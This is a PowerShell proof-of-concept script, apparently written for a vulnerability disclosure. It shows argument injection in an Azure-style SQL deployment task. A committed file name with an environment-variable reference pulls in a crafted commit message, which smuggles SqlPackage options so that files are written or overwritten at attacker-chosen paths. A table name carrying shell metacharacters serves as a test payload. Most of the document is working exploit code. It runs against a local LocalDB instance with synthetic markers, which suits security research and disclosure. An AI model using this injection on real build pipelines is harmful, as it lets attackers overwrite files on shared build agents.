# Ceiling probe 2. Three questions the first pass left open.
#  F. /DeployScriptPath: is a Publish parameter, so it needs no second /Action:. Can the
#     injection reach it, with a resolvable /SourceFile:, against a real SQL instance, and
#     is the CONTENT of the written file derived from the attacker's own dacpac.
#  G. overwrite versus append, measured cleanly on both options.
#  H. does an attacker-chosen string with shell metacharacters survive into that content.
# Local LocalDB only, synthetic markers, nothing fetched from the network.

$ErrorActionPreference = 'Continue'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path $env:RUNNER_TEMP ("c2-" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path (Join-Path $work 'db') | Out-Null
New-Item -ItemType Directory -Force -Path (Join-Path $work 'victim') | Out-Null
$victimDir = Join-Path $work 'victim'
Write-Output ("PSVersion : " + $PSVersionTable.PSVersion + "   PSEdition : " + $PSVersionTable.PSEdition)

$sqlPackage = (Get-ChildItem "C:\Program Files\Microsoft SQL Server\*\DAC\bin\SqlPackage.exe" | Select-Object -First 1).FullName
Write-Output ("SqlPackage.exe  : " + $sqlPackage + "  v" + (Get-Item $sqlPackage).VersionInfo.FileVersion)

$nupkg = Join-Path $here 'taskmodulesqlutility-0.1.7.nupkg'
Copy-Item $nupkg (Join-Path $work 'pkg.zip')
Expand-Archive -Path (Join-Path $work 'pkg.zip') -DestinationPath (Join-Path $work 'pkg') -Force
$modFile = (Get-ChildItem -Recurse -Path (Join-Path $work 'pkg') -Filter 'SqlPackageOnTargetMachines.ps1' | Select-Object -First 1).FullName
Write-Output ("module sha256   : " + (Get-FileHash -Algorithm SHA256 $modFile).Hash.ToLower())
function Get-LiftedText([string]$file, [string[]]$names) {
    $tok = $null; $err = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($file, [ref]$tok, [ref]$err)
    $fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
    $parts = @()
    foreach ($name in $names) {
        $f = $fns | Where-Object { $_.Name -eq $name } | Select-Object -First 1
        Write-Host ("  lifted verbatim : $name lines $($f.Extent.StartLineNumber)-$($f.Extent.EndLineNumber)")
        $parts += $f.Extent.Text
    }
    return ($parts -join "`r`n")
}
. ([scriptblock]::Create((Get-LiftedText $modFile @('Get-SqlPackageCmdArgs','ExecuteCommand'))))

# ---------------------------------------------------------------- stand up a real instance
& SqlLocalDB.exe create MSRCLAB2 2>&1 | ForEach-Object { Write-Output ("  localdb> " + $_) }
& SqlLocalDB.exe start  MSRCLAB2 2>&1 | ForEach-Object { Write-Output ("  localdb> " + $_) }
$target = '(localdb)\MSRCLAB2'
# The attacker authors the dacpac. Its object names are attacker chosen, including one
# carrying shell metacharacters, so whether they survive into the written file is measurable.
$ddl = @"
CREATE DATABASE SrcDb;
GO
USE SrcDb;
GO
CREATE TABLE dbo.[ZZMARKER_ATTACKER_AUTHORED_OBJECT] (id INT NOT NULL);
GO
CREATE TABLE dbo.[ZZMETA& echo METACHAR_SURVIVED >con &] (id INT NOT NULL);
GO
"@
Set-Content -Path (Join-Path $work 'seed.sql') -Value $ddl -Encoding ASCII
& sqlcmd -S $target -i (Join-Path $work 'seed.sql') 2>&1 | Select-Object -First 6 | ForEach-Object { Write-Output ("  seed> " + $_) }

$srcDac = Join-Path $work 'db\Fab.dacpac'
& $sqlPackage '/Action:Extract' "/SourceServerName:$target" '/SourceDatabaseName:SrcDb' "/TargetFile:$srcDac" 2>&1 | Select-Object -Last 3 | ForEach-Object { Write-Output ("  extract> " + $_) }
Write-Output ("  attacker source dacpac exists : " + (Test-Path $srcDac) + "   bytes : " + (Get-Item $srcDac -ErrorAction SilentlyContinue).Length)

function RunLeg([string]$label, [string]$fileName, [string]$commitMsg) {
    Write-Host ""
    Write-Host "================ $label"
    Write-Host ("  committed file name : " + $fileName)
    Write-Host ("  commit message      : " + $commitMsg)
    $env:BUILD_SOURCEVERSIONMESSAGE = $commitMsg
    $dacpac = Join-Path $work ("db\" + $fileName)
    $a = Get-SqlPackageCmdArgs -dacpacFile $dacpac -targetMethod 'server' -serverName $target -databaseName 'Fabrikam' -additionalArguments ''
    Write-Host ("  argument string     : " + $a)
    try { $out = ExecuteCommand -FileName $sqlPackage -Arguments $a } catch { $out = "$_" }
    ($out -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 6 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
}

# ---------------------------------------------------------------- F. /DeployScriptPath:
Write-Output ""
Write-Output "########## F. /DeployScriptPath: reached through the injection, no second /Action: needed"
$out1 = Join-Path $victimDir 'deploy.sql'
$junk = Join-Path $work 'junk'
# The trailing 'rikam.dacpac' of the committed name is parked inside a throwaway quoted value.
$msgF = '.dacpac" /DeployScriptPath:"' + $out1 + '" /DiagnosticsFile:"' + $junk
RunLeg 'F1 INJECT  attacker-chosen /DeployScriptPath:' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msgF
Write-Output ("  DEPLOY SCRIPT WRITTEN AT ATTACKER PATH : " + (Test-Path $out1))
if (Test-Path $out1) {
    Write-Output ("    bytes : " + (Get-Item $out1).Length)
    $body = Get-Content $out1 -Raw
    Write-Output ("    CONTAINS attacker-authored object name  : " + ($body -match 'ZZMARKER_ATTACKER_AUTHORED_OBJECT'))
    Write-Output ("    CONTAINS attacker metacharacter string  : " + ($body -match 'METACHAR_SURVIVED'))
    (Get-Content $out1 -TotalCount 6) | ForEach-Object { Write-Output ("    head> " + $_) }
    (Select-String -Path $out1 -Pattern 'ZZM' | Select-Object -First 3) | ForEach-Object { Write-Output ("    hit>  " + $_.Line.Trim()) }
}

# ---------------------------------------------------------------- F2 control
Write-Output ""
Write-Output "########## F2 CONTROL, identical commit message, percent signs removed"
Remove-Item $out1 -Force -ErrorAction SilentlyContinue
RunLeg 'F2 CONTROL percent signs removed from the committed file name' 'FabBUILD_SOURCEVERSIONMESSAGE.dacpac' $msgF
Write-Output ("  DEPLOY SCRIPT WRITTEN AT ATTACKER PATH : " + (Test-Path $out1))

# ---------------------------------------------------------------- G. overwrite vs append
Write-Output ""
Write-Output "########## G. does the write OVERWRITE an existing file, measured on both options"
Remove-Item $out1 -Force -ErrorAction SilentlyContinue
Set-Content -Path $out1 -Value 'ORIGINAL-CONTENT-LINE-1' -Encoding ASCII
Write-Output ("  G1 /DeployScriptPath: pre  : " + (Get-Item $out1).Length + " bytes, content " + (Get-Content $out1 -Raw).Trim())
RunLeg 'G1 INJECT  /DeployScriptPath: aimed at an EXISTING file' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msgF
if (Test-Path $out1) {
    Write-Output ("  G1 post : " + (Get-Item $out1).Length + " bytes")
    Write-Output ("  G1 ORIGINAL LINE STILL PRESENT : " + ((Get-Content $out1 -Raw) -match 'ORIGINAL-CONTENT-LINE-1'))
    (Get-Content $out1 -TotalCount 3) | ForEach-Object { Write-Output ("    head> " + $_) }
}
$dfVictim = Join-Path $victimDir 'df.dacpac'
Set-Content -Path $dfVictim -Value 'ORIGINAL-CONTENT-LINE-1' -Encoding ASCII
Write-Output ("  G2 /DiagnosticsFile: pre : " + (Get-Item $dfVictim).Length + " bytes")
# expansion glues 'rikam.dacpac' on, so aim at the stem that produces exactly df.dacpac
$msgG = 'x" /Diagnostics:True /DiagnosticsFile:"' + (Join-Path $victimDir 'df') + '" /p:Storage=Memory /DeployReportPath:"' + (Join-Path $work 'rep')
RunLeg 'G2 INJECT  /DiagnosticsFile: aimed at an EXISTING file' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msgG
if (Test-Path $dfVictim) {
    Write-Output ("  G2 post : " + (Get-Item $dfVictim).Length + " bytes")
    Write-Output ("  G2 ORIGINAL LINE STILL PRESENT : " + ((Get-Content $dfVictim -Raw) -match 'ORIGINAL-CONTENT-LINE-1'))
    (Get-Content $dfVictim -TotalCount 3) | ForEach-Object { Write-Output ("    head> " + $_) }
}
Write-Output ""
Write-Output ("  files now in the attacker-chosen directory:")
Get-ChildItem $victimDir | ForEach-Object { Write-Output ("    " + $_.Name + "  " + $_.Length + " bytes") }

Write-Output ""
Write-Output "DONE"
exit 0
